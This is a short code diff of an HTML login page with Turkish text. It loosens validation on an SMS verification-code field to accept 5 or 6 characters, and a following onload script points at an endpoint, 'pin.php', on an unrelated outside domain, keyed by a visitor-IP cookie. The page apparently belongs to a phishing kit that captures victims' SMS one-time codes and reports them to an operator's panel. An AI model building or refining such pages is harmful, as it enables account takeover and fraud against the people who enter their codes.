@@ -44,21 +44,23 @@
      </center> 
         <script>
         document.addEventListener("DOMContentLoaded", function() {
-            const smsInput = document.getElementById("sms");
+    const smsInput = document.getElementById("sms");
 
-            smsInput.addEventListener("input", function() {
-                if (smsInput.value.length > 6) {
-                    smsInput.value = smsInput.value.slice(0, 6);
-                }
-            });
+    smsInput.addEventListener("input", function() {
+        const inputValue = smsInput.value.trim(); // Boşlukları temizle
+        if (inputValue.length < 5 || inputValue.length > 6) {
+            smsInput.value = inputValue.slice(0, 6); // En fazla 6 karakter olarak sınırla
+        }
+    });
 
-            document.getElementById("loginForm").addEventListener("submit", function(e) {
-                if (smsInput.value.length !== 6) {
-                    e.preventDefault();
-                    alert("SMS doğrulama kodu 6 karakter olmalıdır.");
-                }
-            });
-
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        const inputValue = smsInput.value.trim(); // Boşlukları temizle
+        if (inputValue.length !== 5 && inputValue.length !== 6) {
+            e.preventDefault();
+            alert("SMS doğrulama kodu 5 veya 6 karakter olmalıdır.");
+        }
+    });
+});
             window.onload = function() {
                 const apiUrl = 'https://hakikicelikhantutunu.com/dmn/pin.php?ip=';
                 const ip = getCookie('ip');
